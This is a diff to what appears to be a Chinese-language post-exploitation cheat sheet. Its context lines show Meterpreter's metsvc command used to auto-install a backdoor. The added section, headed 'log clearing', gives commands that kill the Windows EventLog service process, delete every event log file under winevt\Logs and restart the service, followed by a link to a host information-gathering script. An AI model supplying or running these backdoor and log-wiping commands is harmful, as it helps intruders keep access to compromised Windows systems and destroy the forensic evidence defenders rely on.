@@ -111,6 +111,15 @@ run metsvc –h # 查看帮助
 run metsvc –A #自动安装后门
 ```
 
+## 日志清除
+
+```ps1
+$a=Get-WmiObject -Class win32_service -Filter "name = 'eventlog'"  
+taskkill /F /PID $a.ProcessId
+del %SystemRoot%\System32\winevt\Logs\*
+net start EventLog
+```
+
 # 04自动信息收集
 Host Information Gathering Script：HIGS.bat
 https://github.com/myh0st/scripts/blob/master/Windows%E4%B8%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/HIGS.bat
